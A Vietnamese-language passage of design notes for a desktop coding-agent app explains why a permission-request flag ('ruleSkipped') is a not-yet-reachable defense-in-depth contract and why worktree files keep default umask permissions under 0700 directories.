- `ruleSkipped` là **hợp đồng chờ sẵn**, không phải khiếm khuyết UX đang xảy ra. Đo lại 2026-09-08: cờ này **không client nào kích được**. Nó chỉ bật khi request mang `updatedInput`, mà (a) `rg updatedInput apps/desktop/ui-next` không ra kết quả nào — desktop chưa có chỗ sửa tham số trước khi duyệt, (b) PWA gửi đúng `{ requestId, decision }`, và (c) [remote-gateway-policy.ts](../../apps/desktop/electron/src/remote-gateway-policy.ts) **cố ý loại bỏ** `updatedInput` lẫn `alwaysAllow` (F7). Nên hàng rào ở sidecar là **phòng thủ theo chiều sâu** cho một năng lực chưa mở, và nó đúng: nó phải có mặt TRƯỚC khi UI sửa tham số ra đời, chứ không phải sau.

  Cố ý **không** thêm dòng thông báo ở thẻ xin quyền bây giờ: một chuỗi người dùng không bao giờ render được thì không tự kiểm chứng được và sẽ mục theo thời gian ([principles.md](../../.claude/rules/principles.md): *YAGNI — không viết cho nhu cầu chưa tồn tại*). Khi nào UI sửa tham số được làm, đó là lúc — và là cùng một PR — phải hiện lý do.

## Quyền file của worktree

Checkout của worktree nằm ở `~/.awog/tasks/<id>/worktrees/<slug>` và `~/.awog/session-worktrees/…`; file bên trong do **git** tạo theo `umask` (thường `0644`), không phải `0600`. **Cố ý không siết** — bảo mật ở đây do **thư mục** giữ:

- `~/.awog` và các thư mục owner/worktree đều được tạo với `mode: 0o700`, mà trên POSIX muốn mở một file thì phải có quyền `x` trên **mọi** thư mục trên đường đi ⇒ người dùng khác trên cùng máy không vào được, dù file con là `0644`. (`umask` chỉ **bớt** bit, nên `0700` không bao giờ nới thành `0755`.)
- Nội dung worktree là bản sao mã nguồn của chính người dùng; bản gốc trong repo cũng đang mang mode theo `umask`. Siết bản sao không tăng bí mật thật, lại làm lệch kỳ vọng của git/editor/script build chạy trên cây đó.
- Ép `0600` phải đổi `umask` toàn tiến trình (ảnh hưởng mọi file sidecar ghi) hoặc `chmod` đệ quy sau mỗi checkout (đắt, và đua với git).

Điều **phải giữ**: mọi nơi tạo thư mục owner/worktree tiếp tục truyền `mode: 0o700`. Quên mode ở một đường tạo mới ⇒ kết luận này mất hiệu lực.
